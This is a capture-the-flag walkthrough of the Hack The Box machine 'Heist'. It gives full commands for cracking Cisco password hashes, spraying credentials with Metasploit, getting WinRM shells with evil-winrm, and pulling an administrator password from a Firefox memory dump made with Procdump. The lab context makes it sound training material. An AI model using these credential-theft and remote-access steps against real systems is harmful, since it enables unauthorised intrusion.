## Information gathering
Let's start with a port scan:
```

As always, when there's a web server, that's the first thing that I look into,
and there's a login page:
![](/images/hackthebox/heist/login.png)

Given that we can login as guest, let's do it:
![](/images/hackthebox/heist/support.png)

It looks like someone needed help with the configuration of a Cisco router and
asked for help, it looks like it's username is Hazard. Let's check the
attachment:
```

```

Straight off we have three passwords hashes. The `secret 5` type can be cracked
with John the Ripper, so after writing it to a file, let's run `john secret5
--wordlist=rockyou.txt`. After a couple of seconds, we find out that the
password is `stealth1agent`.

The other two hashes can be decoded simply with an online tool, like [this](https://www.ifm.net.nz/cookbooks/passwordcracker.html) one, so here they are:
```
0242114B0E143F015F5D1E161713:$uperP@ssword
02375012182C1A1D751618034F36415408:Q4)sJu\Y8qz*A3?d
```

## Further exploration
As we have a username and some passwords, we can try to authenticate to the `smb`
server:
```
$ smbclient -L \\\\10.10.10.149 -U 'hazard%stealth1agent'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.149 failed (Error NT_STATUS_IO_TIMEOUT)
Failed to connect with SMB1 -- no workgroup available
```

Out of luck, because of the order that they are written in the file, the first
one works!

We can use `lookupsid` from
[impacket](https://github.com/SecureAuthCorp/impacket) to enumerate users in the
Windows domain:
```
$ ./lookupsid.py 10.10.10.149/hazard:stealth1agent@10.10.10.149

```

## Getting a shell
We can now try to login with all usernames and passwords combinations that
we've found. There's a handy metasploit module that can help us. After writing
all the users in a file called `users` and the passwords in `pws`, let's load the
module and set the options:
![](/images/hackthebox/heist/metasploit-options.png)

And let's run it with `exploit`:
![](/images/hackthebox/heist/metasploit-results.png)

Cool! We've found the passwords of Hazard and Chase! Now we can use `evil-winrm`
(install it with `gem install --user evil-winrm`) to check if one of the two
users is allowed to get a remote shell:
```
$ evil-winrm -u Hazard -p stealth1agent -i 10.10.10.149
Evil-WinRM shell v2.0
Info: Establishing connection to remote endpoint
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
Error: Exiting with code 1
```
No luck with Hazard, let's try with Chase:
```
$ evil-winrm -u Chase -p 'Q4)sJu\Y8qz*A3?d' -i 10.10.10.149
Evil-WinRM shell v2.0
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Chase\Documents>
```

And we got a shell! Let's check the flag:
```
*Evil-WinRM* PS C:\Users\Chase\Desktop> Get-Acl user.txt
    Directory: C:\Users\Chase\Desktop

Path     Owner             Access
----     -----             ------
user.txt SUPPORTDESK\Chase NT AUTHORITY\SYSTEM Allow  FullControl...
```

## Privilege escalation

Listing the files in the Desktop, there's a curious one:
```
PS > type todo.txt
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.
```

Following the usual enumeration techniques and listing the running processes
with `Get-Process`, reveals us that there are some instances of Firefox running,
which stands out among the others. The first thing that I did was to search in
the user `AppData` folder for Firefox data like bookmarks, visited URLs and
things like that, but I had no luck with it.

The next thing that came to my mind is to dump the processes memory with
[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump).
After downloading it on our machine, and moving it in the same folder that we
launched `evil-winrm` from, we can upload it using it's `upload` command:
![](/images/hackthebox/heist/upload.png)

Now we can dump the Firefox process memory using the PID from the `Get-Process`
command:
![](/images/hackthebox/heist/procdump.png)

Because I'm a PowerShell noob, I've downloaded the dump on my machine to
analyze it, with `download firefox.exe_191129_053757.dmp` and after (quite) a
bit of time I started searching for strings.

An interesting string to find in the memory dump would be `password`, so let's
search for it:
```
$ strings firefox.exe_191129_053757.dmp | grep -i password
"C:\Program Files\Mozilla Firefox\firefox.exe" localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```

Bingo! And we can get a shell with these credentials:
```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> Get-Acl root.txt
    Directory: C:\Users\Administrator\Desktop

Path     Owner                  Access
----     -----                  ------
root.txt BUILTIN\Administrators NT AUTHORITY\SYSTEM Allow  FullControl...
```

And we have access to the root flag!

## Wrapping up

I have to admit this one took me quite a bit of time, even though it was only 20
points, because I went down the `AppData` folder rabbit hole, and there were
some cache files and a password database that looked interesting. This is the
first time that I've analyzed a process' memory, which is an interesting
technique.

Thanks for reading!
